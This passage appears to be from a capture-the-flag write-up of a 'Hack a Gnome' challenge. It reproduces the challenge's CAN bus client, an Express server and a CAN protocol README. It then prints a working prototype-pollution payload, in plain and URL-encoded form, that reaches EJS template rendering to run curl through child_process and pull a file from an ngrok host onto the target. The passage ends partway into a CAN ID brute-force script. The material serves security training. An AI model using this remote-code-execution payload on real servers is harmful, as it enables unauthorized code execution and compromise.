            <span class="n">data</span><span class="o">=</span><span class="p">[],</span> <span class="c1"># No specific data needed for these simple commands</span>
            <span class="n">is_extended_id</span><span class="o">=</span><span class="kc">False</span>
        <span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">bus</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Sent command: ID=0x</span><span class="si">{</span><span class="n">command_id</span><span class="si">:</span><span class="s2">X</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">can</span><span class="o">.</span><span class="n">CanError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error sending message: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">listen_for_messages</span><span class="p">(</span><span class="n">bus</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;Listens for CAN messages and prints them.&quot;&quot;&quot;</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Listening for messages on </span><span class="si">{</span><span class="n">bus</span><span class="o">.</span><span class="n">channel_info</span><span class="si">}</span><span class="s2">. Press Ctrl+C to stop.&quot;</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="c1"># Iterate indefinitely over messages received on the bus</span>
            <span class="k">for</span> <span class="n">msg</span> <span class="ow">in</span> <span class="n">bus</span><span class="p">:</span>
                <span class="c1"># Get current time for the timestamp</span>
                <span class="n">timestamp</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S.</span><span class="si">%f</span><span class="s1">&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span> <span class="c1"># Milliseconds precision</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2"> | Received: </span><span class="si">{</span><span class="n">msg</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
                <span class="c1"># You could add logic here to filter or react to specific messages</span>
                <span class="c1"># if msg.arbitration_id == 0x100:</span>
                <span class="c1">#    print(&quot;  (Noise message)&quot;)</span>

        <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">Stopping listener...&quot;</span><span class="p">)</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">An error occurred during listening: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
        <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s2">&quot;Send CAN bus commands or listen for messages.&quot;</span><span class="p">)</span>
        <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
            <span class="s2">&quot;command&quot;</span><span class="p">,</span>
            <span class="n">choices</span><span class="o">=</span><span class="n">COMMAND_CHOICES</span><span class="p">,</span>
            <span class="n">help</span><span class="o">=</span><span class="sa">f</span><span class="s2">&quot;The command to send (</span><span class="si">{</span><span class="s1">&#39;, &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">COMMAND_MAP</span><span class="o">.</span><span class="n">keys</span><span class="p">())</span><span class="si">}</span><span class="s2">) or &#39;listen&#39; to monitor the bus.&quot;</span>
        <span class="p">)</span>
        <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="c1"># Initialize the CAN bus interface</span>
            <span class="n">bus</span> <span class="o">=</span> <span class="n">can</span><span class="o">.</span><span class="n">interface</span><span class="o">.</span><span class="n">Bus</span><span class="p">(</span><span class="n">channel</span><span class="o">=</span><span class="n">IFACE_NAME</span><span class="p">,</span> <span class="n">interface</span><span class="o">=</span><span class="s1">&#39;socketcan&#39;</span><span class="p">,</span> <span class="n">receive_own_messages</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span> <span class="c1"># Set receive_own_messages if needed</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Successfully connected to </span><span class="si">{</span><span class="n">IFACE_NAME</span><span class="si">}</span><span class="s2">.&quot;</span><span class="p">)</span>
        <span class="k">except</span> <span class="ne">OSError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error connecting to CAN interface </span><span class="si">{</span><span class="n">IFACE_NAME</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Make sure the </span><span class="si">{</span><span class="n">IFACE_NAME</span><span class="si">}</span><span class="s2"> interface is up (&#39;sudo ip link set up </span><span class="si">{</span><span class="n">IFACE_NAME</span><span class="si">}</span><span class="s2">&#39;)&quot;</span><span class="p">)</span>
            <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;And that you have the necessary permissions.&quot;</span><span class="p">)</span>
            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;An unexpected error occurred during bus initialization: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">command</span> <span class="o">==</span> <span class="s2">&quot;listen&quot;</span><span class="p">:</span>
            <span class="n">listen_for_messages</span><span class="p">(</span><span class="n">bus</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">command_id</span> <span class="o">=</span> <span class="n">COMMAND_MAP</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">command</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">command_id</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span> <span class="c1"># Should not happen due to choices constraint</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Invalid command for sending: </span><span class="si">{</span><span class="n">args</span><span class="o">.</span><span class="n">command</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
                <span class="n">bus</span><span class="o">.</span><span class="n">shutdown</span><span class="p">()</span>
                <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
            <span class="n">send_command</span><span class="p">(</span><span class="n">bus</span><span class="p">,</span> <span class="n">command_id</span><span class="p">)</span>
            <span class="c1"># Give a moment for the message to be potentially processed if listening elsewhere</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>

        <span class="c1"># Shutdown the bus connection cleanly</span>
        <span class="n">bus</span><span class="o">.</span><span class="n">shutdown</span><span class="p">()</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;CAN bus connection closed.&quot;</span><span class="p">)</span>

    <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
        <span class="n">main</span><span class="p">()</span>
</code></pre></div>
</details>
<details class="tip">
<summary>server.js</summary>
<div class="highlight"><pre><span></span><code>require(&#39;dotenv&#39;).config();
const express = require(&#39;express&#39;);
const dns = require(&#39;dns&#39;); // Import dns module
// Remove http, ws, path, url imports related to WebSockets
const path = require(&#39;path&#39;); // Keep path for file serving
const { exec } = require(&#39;child_process&#39;); // Import exec

const app = express();

// --- Environment Variables &amp; Initial Setup ---
const PARENTID = process.env.PARENTID;
let allowedIps = null; // Initialize allowed IPs

if (PARENTID) {
    console.log(`PARENTID is set to: ${PARENTID}. Resolving...`);
    dns.lookup(PARENTID, { all: true }, (err, addresses) =&gt; {
        if (err) {
            console.error(`Failed to resolve PARENTID hostname &quot;${PARENTID}&quot;: ${err.message}. Allowing all connections.`);
            // Keep allowedIps = null to allow all
        } else if (addresses &amp;&amp; addresses.length &gt; 0) {
            allowedIps = addresses.map(addr =&gt; addr.address).join(&#39;, &#39;);
            console.log(`Resolved PARENTID &quot;${PARENTID}&quot; to IPs: ${allowedIps}. Only these IPs will be allowed.`);
        } else {
            console.warn(`PARENTID &quot;${PARENTID}&quot; resolved, but no IP addresses found. Allowing all connections.`);
            // Keep allowedIps = null to allow all
        }
    });
} else {
    console.log(&quot;PARENTID environment variable not set. Allowing all connections.&quot;);
    // Keep allowedIps = null to allow all
}


// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true })); // To parse form data

// --- IP Filtering Middleware ---
app.use((req, res, next) =&gt; {
    // If allowedIps is null (PARENTID not set or failed to resolve), allow the request.
    if (allowedIps === null) {
        return next();
    }
    // If allowedIps is set, check if the request IP is in the list.
    // Note: req.ip might need &#39;trust proxy&#39; setting if behind a reverse proxy.
    const clientIp = req.ip.split(&#39;:&#39;).pop(); // Get the last part of the IP address (IPv6 compatibility)
    if (allowedIps.includes(clientIp)) {
        //console.log(`Allowed connection from ${clientIp} (matches PARENTID)`);
        next(); // IP is allowed
    } else {
        console.warn(`Rejected connection from ${clientIp} (does not match PARENTID IPs: ${allowedIps})`);
        res.status(403).send(&#39;Forbidden: Access denied. &#39; + `Rejected connection from ${clientIp} (does not match PARENTID IPs: ${allowedIps})`); // IP is not allowed
    }
});

// --- Serve Static Files ---
// Serve files from the &#39;static&#39; directory within app_code
// Requests proxied from backend (e.g., /static/phaser.min.js) will be handled here.
app.use(&#39;/static&#39;, express.static(path.join(__dirname, &#39;static&#39;)));

app.set(&#39;view engine&#39;, &#39;ejs&#39;);

// --- Game Constants ---
// Remove WebSocket related constants
const gnomebotname = &quot;GnomeBot&quot; + Math.floor(Math.random() * 99999); // Random name for the gnomebot

//var containerUsername = &quot;Unknown&quot;; // Default username - Keep for stats route, but won&#39;t be updated by WS
// need from env variable otherwise unknown
const containerUsername = process.env.USERNAME || &quot;Unknown&quot;; // Default username, can be set via environment variable
const processStartTime = Date.now(); // Store the start time of the process - Keep for stats route
const gnomeBotObjectDetails = {
    settings: {
        name: gnomebotname,
        model_version: &quot;2.3.8&quot;,
        firmware_version: &quot;GNM-4.12.0&quot;,
    },
}

// 🏠 Home route (authentication handled by proxy)
app.get(&#39;/home&#39;, (req, res) =&gt; {
    //console.log(`Rendering home view`);
    res.setHeader(&#39;Content-Type&#39;, &#39;text/html&#39;);
    res.sendFile(path.join(__dirname, &#39;views&#39;, &#39;home.ejs&#39;));
});

app.get(&#39;/control&#39;, (req, res) =&gt; {
    //console.log(`Rendering control view`);
    res.setHeader(&#39;Content-Type&#39;, &#39;text/html&#39;);
    res.sendFile(path.join(__dirname, &#39;views&#39;, &#39;control.ejs&#39;));
});

app.get(&#39;/stats&#39;, (req, res) =&gt; {
    console.log(`Rendering stats view`); // Changed log message
    let gnomeStats = [
        { name: &quot;name&quot;, value: gnomeBotObjectDetails?.settings?.name || gnomebotname }, // Fallback to random name if not set
        { name: &quot;model_version&quot;, value: gnomeBotObjectDetails?.settings?.model_version || &quot;Unknown&quot; }, // Fallback to &quot;Unknown&quot; if not set
        { name: &quot;description&quot;, value: &quot;Holiday remote controlled gnome for your home.&quot; },
        { name: &quot;status&quot;, value: &quot;active&quot; }, // Status might need updating if based on WS connection
        { name: &quot;last_updated&quot;, value: new Date().toISOString() },
        { name: &quot;last_updated_by&quot;, value: containerUsername }, // Username won&#39;t be updated via WS anymore
        { name: &quot;last_accessed_by&quot;, value: containerUsername }, // Username won&#39;t be updated via WS anymore
        { name: &quot;battery_level&quot;, value: Math.max(0, 100 - Math.floor((Date.now() - processStartTime) / (2 * 60 * 60 * 1000) * 100)) + &quot;%&quot; }, // Battery level
        { name: &quot;uptime&quot;, value: Math.floor((Date.now() - processStartTime) / 1000) + &quot; seconds&quot; }, // Uptime in seconds
        { name: &quot;cpu_temperature&quot;, value: (Math.random() * 30 + 40).toFixed(1) + &quot;°C&quot; }, // Robot CPU temp
        { name: &quot;current_task&quot;, value: &quot;Idle&quot; }, // Task might need updating if based on WS state
        { name: &quot;network_status&quot;, value: &quot;Connected&quot; }, // Network status might need updating
        { name: &quot;error_logs&quot;, value: &quot;None&quot; }, // If any recent errors occurred
        { name: &quot;gnome_mode&quot;, value: &quot;Stealth&quot; }, // Playful feature mode
        { name: &quot;firmware_version&quot;, value: gnomeBotObjectDetails?.settings?.firmware_version || &quot;Unknown&quot; }, // Firmware tracking
        { name: &quot;gnome_mood&quot;, value: [&quot;Happy&quot;, &quot;Grumpy&quot;, &quot;Mischievous&quot;][Math.floor(Math.random() * 3)] }, // Personality status
        { name: &quot;light_sensor&quot;, value: Math.random() &gt; 0.5 ? &quot;Bright&quot; : &quot;Dim&quot; }, // Light environment detection
        { name: &quot;gnome_config_object&quot;, value: JSON.stringify(gnomeBotObjectDetails) } // Settings object
    ];
    res.setHeader(&#39;Cache-Control&#39;, &#39;no-store, no-cache, must-revalidate, proxy-revalidate&#39;);
    res.setHeader(&#39;Pragma&#39;, &#39;no-cache&#39;);
    res.setHeader(&#39;Expires&#39;, &#39;0&#39;);
    res.render(&#39;stats&#39;, { gnomeStats: gnomeStats }); // Removed wsUrl
});

app.get(&#39;/ctrlsignals&#39;, (req, res) =&gt; {
    const requestPayload = JSON.parse(decodeURIComponent(req.query.message));
    res.setHeader(&#39;Cache-Control&#39;, &#39;no-store, no-cache, must-revalidate, proxy-revalidate&#39;);
    res.setHeader(&#39;Pragma&#39;, &#39;no-cache&#39;);
    res.setHeader(&#39;Expires&#39;, &#39;0&#39;);
    // Check if the request payload is valid
    if (!requestPayload || !requestPayload.action) {
        console.error(&quot;Invalid request payload&quot;);
        res.status(400).send(&#39;Invalid request payload&#39;);
        return;
    }
    // Handle the control signal
    switch (requestPayload.action) {
        case &#39;move&#39;:
            // Handle move action
            console.log(`Moving in direction: ${requestPayload.direction}`);
            res.header(&#39;Content-Type&#39;, &#39;application/json&#39;);
            // lets set headers so it never caches
            if (!requestPayload.direction) {
                res.send(JSON.stringify({ type: &quot;message&quot;, data: &quot;error&quot;, message: &quot;No direction specified&quot; }));
                return;
            }
            // left right up down
            const direction = requestPayload.direction;
            const command = `/usr/bin/python3 /app/canbus_client.py &quot;${direction}&quot;`; // Construct the command

            switch (direction) {
                case &#39;left&#39;:
                case &#39;right&#39;:
                case &#39;up&#39;:
                case &#39;down&#39;:
                    console.log(`Executing command: ${command}`);
                    exec(command, (error, stdout, stderr) =&gt; {
                        if (error) {
                            console.error(`Error executing command: ${error.message}`);
                            // Optionally send error back, but the response is already sent
                            return;
                        }
                        if (stderr) {
                            console.error(`Command stderr: ${stderr}`);
                            // Optionally send error back
                            return;
                        }
                        console.log(`Command stdout: ${stdout}`);
                    });
                    res.send(JSON.stringify({ type: &quot;message&quot;, data: &quot;success&quot;, message: `Moving ${direction}` }));
                    break;
                default:
                    console.error(&quot;Unknown direction&quot;);
                    res.send(JSON.stringify({ type: &quot;message&quot;, data: &quot;error&quot;, message: &quot;Unknown direction&quot; }));
                    return;
            }
            break;
        case &#39;update&#39;:
            try {
                const { key, subkey, value } = requestPayload;
                gnomeBotObjectDetails[key][subkey] = value;
                res.header(&#39;Content-Type&#39;, &#39;application/json&#39;);
                res.send(JSON.stringify({ type: &quot;message&quot;, data: &quot;success&quot;, message: `Updated ${key}.${subkey} to ${value}` }));
            }
            catch (error) {
                res.setHeader(&#39;Content-Type&#39;, &#39;application/json&#39;);
                res.send(JSON.stringify({ type: &quot;message&quot;, data: &quot;error&quot;, message: `Error updating settings: ${error.message}` }));
            }
            break;
        default:
            console.error(&quot;Unknown action&quot;);
            res.status(400).send(&#39;Unknown action&#39;);
            return;
    }
});

// ✨ Health Check Endpoint
app.get(&#39;/healthz&#39;, (req, res) =&gt; {
    // Could add checks here (e.g., DB connection) if needed
    res.status(200).send(&#39;OK&#39;);
});

// --- Server Setup ---
const PORT = process.env.PORT || 3000;
// Remove http server creation and WebSocket server setup

// 🚀 Start the server (using app.listen directly)
app.listen(PORT, () =&gt; {
    console.log(`🚀 Server (HTTP only) running on port ${PORT}`); // Updated log message
});
</code></pre></div>
</details>
<details class="tip">
<summary>README.md</summary>
<div class="highlight"><pre><span></span><code>GnomeBot CAN Bus Protocol - Top Secret Workshop Edition!
Ho ho hold on there! Welcome to the inner workings of the GnomeBot&#39;s communication system. This marvelous contraption uses the **CAN (Controller Area Network)** bus to chatter away about its status and sometimes even listen to requests. It&#39;s like the reindeer telegraph, but with more wires and less sneezing.

This document details the known signals whizzing around on the `gcan0` interface. Remember, all multi-byte values are sent **Big Endian** (Most Significant Byte first), just like how Santa lists the nicest kids first!

---

## 🎁 CAN Data Requests (Client -&gt; GnomeBot )

Sometimes, you need to poke the GnomeBot to get specific information *right now*. Send one of these messages, and the  *should* reply with the corresponding Status/Data message (see below).

| CAN ID (Hex) | Constant Name             | Description                                      | Data Sent |
| :----------- | :------------------------ | :----------------------------------------------- | :-------- |
| `0x400`      | `requestBatteryVoltageID` | Asks for the current battery voltage reading.    | (Empty)   |
| `0x470`      | `requestGPSFixID`         | Inquires about the current GPS fix status.       | (Empty)   |
| `0x410`      | `requestMotorSpeedLeftID` | Requests the current speed of the left motor.    | (Empty)   |
| `0x460`      | `requestSystemTempID`     | Asks for the GnomeBot&#39;s internal temperature.    | (Empty)   |
| `0x4C0`      | `requestPayloadStatusID`  | Requests the current status of the payload/gripper. | (Empty)   |

---

## ✨ CAN Status &amp; Data Responses (GnomeBot  -&gt; Client)

These messages are the GnomeBot  telling the world (or at least the CAN bus) what&#39;s going on. Some are sent automatically like clockwork (Periodic), some only when asked (Response Only), and some do both!

| CAN ID (Hex) | Constant Name                | Behavior              | Data Bytes | Data Type        | Description &amp; Units/Meaning                                                                 |
| :----------- | :--------------------------- | :-------------------- | :--------- | :--------------- | :------------------------------------------------------------------------------------------ |
| `0x300`      | `statusBatteryVoltageID`     | Response Only         | 2          | `uint16`         | Battery voltage in **millivolts (mV)**. E.g., `0x30D4` = 12500mV = 12.5V.                     |
| `0x310`      | `statusMotorSpeedLeftID`     | Periodic + Response   | 2          | `int16`          | Left motor speed in **RPM**. Can be negative for reverse!                                   |
| `0x311`      | `statusMotorSpeedRightID`    | Periodic              | 2          | `int16`          | Right motor speed in **RPM**.                                                               |
| `0x320`      | `statusSonarDistanceFrontID` | Periodic              | 2          | `uint16`         | Front sonar distance reading in **centimeters (cm)**.                                       |
| `0x321`      | `statusSonarDistanceRearID`  | Periodic              | 2          | `uint16`         | Rear sonar distance reading in **centimeters (cm)**.                                        |
| `0x330`      | `statusIMUDataID`            | Periodic              | 2          | `byte[0]`, `byte[1]` | Byte 0: Simple sequence/second counter. Byte 1: Status flags (e.g., `0x01` = OK).     |
| `0x340`      | `statusHeadlightID`          | Periodic              | 1          | `uint8`          | Headlight status: `0x00` = Off, `0x01` = On. Is it Rudolph&#39;s spare nose?                  |
| `0x350`      | `statusWifiStatusID`         | Periodic              | 2          | `byte[0]`, `byte[1]` | Byte 0: WiFi Signal Strength (0-100%). Byte 1: Status (`0`=Disc, `1`=Conn).           |
| `0x351`      | `statusBluetoothStatusID`    | Periodic              | 2          | `byte[0]`, `byte[1]` | Byte 0: Number of paired devices. Byte 1: Status (`0`=Off, `1`=On, `2`=Paired).          |
| `0x360`      | `statusSystemTempID`         | Periodic + Response   | 1          | `int8`           | Internal system temperature in **degrees Celsius (°C)**. Keep it cool, like the North Pole! |
| `0x370`      | `statusGPSFixID`             | Response Only         | 1          | `uint8`          | GPS Fix Status: `0` = No Fix, `1` = 2D Fix, `2` = 3D Fix.                                 |
| `0x380`      | `statusWheelOdomLeftID`      | Periodic              | 4          | `uint32`         | Cumulative left wheel odometry ticks. Rollin&#39; towards Christmas!                           |
| `0x381`      | `statusWheelOdomRightID`     | Periodic              | 4          | `uint32`         | Cumulative right wheel odometry ticks.                                                     |
| `0x390`      | `statusAmbientLightID`       | Periodic              | 2          | `uint16`         | Ambient light sensor reading in **Lux**. Brighter than Rudolph&#39;s nose?                      |
| `0x391`      | `statusHumidityID`           | Periodic              | 1          | `uint8`          | Relative humidity percentage (%). Is it snowing?                                          |
| `0x392`      | `statusPressureID`           | Periodic              | 4          | `uint32`         | Barometric pressure in **Pascals (Pa)**.                                                  |
| `0x3A0`      | `statusCurrentDrawID`        | Periodic              | 2          | `int16`          | Main battery current draw in **milliamps (mA)**. How much juice does this thing use?!   |
| `0x3B0`      | `statusEstopStatusID`        | Periodic              | 1          | `uint8`          | Emergency Stop Status: `0x00` = OK, `0x01` = PRESSED! (Hopefully not!)                    |
| `0x3C0`      | `statusPayloadStatusID`      | Periodic + Response   | 1          | `uint8` (Bitmap) | Payload Status: Bit 0 (`0x01`): Gripper Open, Bit 1 (`0x02`): Sensor Active.        |
| `0x3D0`      | `statusNavStatusID`          | Periodic              | 1          | `uint8`          | Navigation System Status: `0`=Idle, `1`=Navigating, `2`=Reached, `3`=Failed.          |
| `0x3E0`      | `statusFanSpeedID`           | Periodic              | 1          | `uint8`          | Cooling fan speed percentage (%). Keeping the circuits frosty.                          |
| `0x3FF`      | `statusHeartbeatID`          | Periodic              | 1          | `uint8`          | Heartbeat counter. Increments with each message. Lub-dub, lub-dub... is it alive?!      |

---

## 🛠️ Movement Commands &amp; Acknowledgments (Client &lt;-&gt; GnomeBot )

```
TODO: There are more signals related to controlling the GnomeBot&#39;s movement
(Up/Down/Left/Right) and the acknowledgments sent back by the bot.
These involve CAN IDs that are not totally settled yet. We are still polishing
the documentation for these - check back after eggnog break!
```
</code></pre></div>
</details>
<p>Now, the current canbus_client.py does not have the right command map to move the gnome, 
we will need to brute force the hex values for the command map. <br/>
But before that, we will need to upload the changed canbus_client.py to the server.</p>
<p>We set up a ngrok listener poonted to a local python web server. <br/>
The local python server is running from the directory where we have the original canbus_client.py copied from the server already.
<div class="highlight"><pre><span></span><code>ngrok http 80
</code></pre></div>
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_25.png" /></p>
<p><div class="highlight"><pre><span></span><code>python -m http.server 80
</code></pre></div>
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_26.png" /></p>
<p>we use the below payload with the <code>/ctrlsignals</code> endpoint.<br/>
This would get the canbus_client.py from the URL <code>https://transsepulchral-towardly-jazmin.ngrok-free.dev/canbus_client.py</code> which then would get the URL from out local directory where the local python wer server is running.</p>
<div class="highlight"><pre><span></span><code>{&quot;action&quot;:&quot;update&quot;, &quot;key&quot;:&quot;__proto__&quot;, &quot;subkey&quot;:&quot;outputFunctionName&quot;, &quot;value&quot;:&quot;test1;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;$(curl https://transsepulchral-towardly-jazmin.ngrok-free.dev/canbus_client.py -o canbus_client.py)&#39;);test2&quot;}
</code></pre></div>
<p>Below is the actual URL encoded version we would use. <br/>
<div class="highlight"><pre><span></span><code>%7B%22action%22%3A%22update%22%2C%20%22key%22%3A%22__proto__%22%2C%20%22subkey%22%3A%22outputFunctionName%22%2C%20%22value%22%3A%22test1%3Bprocess.mainModule.require%28%27child_process%27%29.execSync%28%27%24%28curl%20https%3A%2F%2Ftranssepulchral-towardly-jazmin.ngrok-free.dev%2Fcanbus_client.py%20-o%20canbus_client.py%29%27%29%3Btest2%22%7D
</code></pre></div>
<img alt="Hack-a-genome" src="../../img/objectives/Hack_a_Gnome/Hack_a_Gnome_27.png" /></p>
<p>Accessing the /status page would fetch the modified canbus_client.py from local python server to the remote machine via ngrok.<br/> </p>
<p>We modify the original canbus_client.py with bruteforcing the hex ranges.
Using the range 0x200 - 0x2FF.</p>
<details>
<summary>Python script - canbus_client.py with brutefoce range for the command map</summary>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">  1</span>
<span class="normal">  2</span>
<span class="normal">  3</span>
<span class="normal">  4</span>
<span class="normal">  5</span>
<span class="normal">  6</span>
<span class="normal">  7</span>
<span class="normal">  8</span>
<span class="normal">  9</span>
<span class="normal"> 10</span>
<span class="normal"> 11</span>
<span class="normal"> 12</span>
<span class="normal"> 13</span>
<span class="normal"> 14</span>
<span class="normal"> 15</span>
<span class="normal"> 16</span>
<span class="normal"> 17</span>
<span class="normal"> 18</span>
<span class="normal"> 19</span>
<span class="normal"> 20</span>
<span class="normal"> 21</span>
<span class="normal"> 22</span>
<span class="normal"> 23</span>
<span class="normal"> 24</span>
<span class="normal"> 25</span>
<span class="normal"> 26</span>
<span class="normal"> 27</span>
<span class="normal"> 28</span>
<span class="normal"> 29</span>
<span class="normal"> 30</span>
<span class="normal"> 31</span>
<span class="normal"> 32</span>
<span class="normal"> 33</span>
<span class="normal"> 34</span>
<span class="normal"> 35</span>
<span class="normal"> 36</span>
<span class="normal"> 37</span>
<span class="normal"> 38</span>
<span class="normal"> 39</span>
<span class="normal"> 40</span>
<span class="normal"> 41</span>
<span class="normal"> 42</span>
<span class="normal"> 43</span>
<span class="normal"> 44</span>
<span class="normal"> 45</span>
<span class="normal"> 46</span>
<span class="normal"> 47</span>
<span class="normal"> 48</span>
<span class="normal"> 49</span>
<span class="normal"> 50</span>
<span class="normal"> 51</span>
<span class="normal"> 52</span>
<span class="normal"> 53</span>
<span class="normal"> 54</span>
<span class="normal"> 55</span>
<span class="normal"> 56</span>
<span class="normal"> 57</span>
<span class="normal"> 58</span>
<span class="normal"> 59</span>
<span class="normal"> 60</span>
<span class="normal"> 61</span>
<span class="normal"> 62</span>
<span class="normal"> 63</span>
<span class="normal"> 64</span>
<span class="normal"> 65</span>
<span class="normal"> 66</span>
<span class="normal"> 67</span>
<span class="normal"> 68</span>
<span class="normal"> 69</span>
<span class="normal"> 70</span>
<span class="normal"> 71</span>
<span class="normal"> 72</span>
<span class="normal"> 73</span>
<span class="normal"> 74</span>
<span class="normal"> 75</span>
<span class="normal"> 76</span>
<span class="normal"> 77</span>
<span class="normal"> 78</span>
<span class="normal"> 79</span>
<span class="normal"> 80</span>
<span class="normal"> 81</span>
<span class="normal"> 82</span>
<span class="normal"> 83</span>
<span class="normal"> 84</span>
<span class="normal"> 85</span>
<span class="normal"> 86</span>
<span class="normal"> 87</span>
<span class="normal"> 88</span>
<span class="normal"> 89</span>
<span class="normal"> 90</span>
<span class="normal"> 91</span>
<span class="normal"> 92</span>
<span class="normal"> 93</span>
<span class="normal"> 94</span>
<span class="normal"> 95</span>
<span class="normal"> 96</span>
<span class="normal"> 97</span>
<span class="normal"> 98</span>
<span class="normal"> 99</span>
<span class="normal">100</span>
<span class="normal">101</span>
<span class="normal">102</span>
<span class="normal">103</span>
<span class="normal">104</span>
<span class="normal">105</span>
<span class="normal">106</span>
<span class="normal">107</span>
<span class="normal">108</span>
<span class="normal">109</span>
<span class="normal">110</span>
<span class="normal">111</span>
<span class="normal">112</span>
<span class="normal">113</span>
<span class="normal">114</span>
<span class="normal">115</span>
<span class="normal">116</span>
<span class="normal">117</span>
<span class="normal">118</span>
<span class="normal">119</span>
<span class="normal">120</span>
<span class="normal">121</span>
<span class="normal">122</span>
<span class="normal">123</span>
<span class="normal">124</span>
<span class="normal">125</span>
<span class="normal">126</span>
<span class="normal">127</span>
<span class="normal">128</span>
<span class="normal">129</span>
<span class="normal">130</span>
<span class="normal">131</span>
<span class="normal">132</span>
<span class="normal">133</span>
<span class="normal">134</span>
<span class="normal">135</span>
<span class="normal">136</span>
<span class="normal">137</span>
<span class="normal">138</span>
<span class="normal">139</span>
<span class="normal">140</span>
<span class="normal">141</span>
<span class="normal">142</span>
<span class="normal">143</span>
<span class="normal">144</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="ch">#!/usr/bin/python3</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">can</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">datetime</span>  <span class="c1"># To show timestamps for received messages</span>

<span class="c1"># ==================================================</span>
<span class="c1"># AUTO BRUTE-FORCE RANGE (FULL 11-BIT CAN SPACE)</span>
<span class="c1"># ==================================================</span>
<span class="n">BRUTE_START_ID</span> <span class="o">=</span> <span class="mh">0x200</span>
<span class="n">BRUTE_END_ID</span>   <span class="o">=</span> <span class="mh">0x2FF</span>

<span class="c1"># Known telemetry/status range from README</span>
<span class="n">SKIP_RANGES</span> <span class="o">=</span> <span class="p">[</span>
